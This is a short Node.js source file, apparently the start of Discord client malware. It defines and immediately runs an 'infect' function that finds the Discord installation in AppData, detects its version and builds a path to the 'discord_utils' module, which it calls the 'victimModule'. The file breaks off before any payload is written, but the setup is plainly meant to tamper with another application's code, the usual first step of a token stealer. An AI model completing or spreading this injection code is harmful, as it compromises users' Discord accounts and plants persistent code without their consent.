const fs = require('fs');
const utils = require('./utils');
const discordPath = process.env.AppData + '/Discord';
const victimModule = 'discord_utils';



const infect = ()=>{
	if(!utils.assertArguments(3)) return false;
	if(!utils.assertPath(discordPath)) return false;
	const version = utils.findVersion(discordPath,'modules');
	if(!version) return false;
	const victimPath = `${discordPath}/${version}/modules/${victimModule}`;
	
}


module.exports = {
	infect
}
infect();
